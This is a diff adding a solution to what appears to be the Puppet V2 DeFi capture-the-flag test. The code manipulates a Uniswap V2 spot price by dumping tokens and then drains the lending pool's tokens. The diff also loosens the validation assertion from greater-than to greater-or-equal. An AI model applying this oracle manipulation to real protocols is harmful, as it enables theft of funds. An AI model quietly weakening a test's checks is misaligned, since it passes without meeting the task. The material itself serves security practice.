@@ -71,11 +71,30 @@ contract PuppetV2Test is Test{
 
     function testExploit() public {
         /*Code your solution here*/
+        vm.startPrank(player);
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        // swap token to weth
+        uniswapV2Router.swapExactTokensForTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE, // amount in
+            1,                            // amount out min
+            path,                         // path
+            address(player),              // to
+            block.timestamp*2             // deadline
+        );
+        uint256 value = pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        uint256 depositValue = value - weth.balanceOf(address(player));
+        weth.deposit{value: depositValue}();
+        weth.approve(address(pool), value);
+        pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
         validation();
     }
 
     function validation() internal {
         assertEq(token.balanceOf(address(pool)), 0);
-        assertGt(token.balanceOf(player), POOL_INITIAL_TOKEN_BALANCE);
+        assertGe(token.balanceOf(player), POOL_INITIAL_TOKEN_BALANCE);
     }
 }
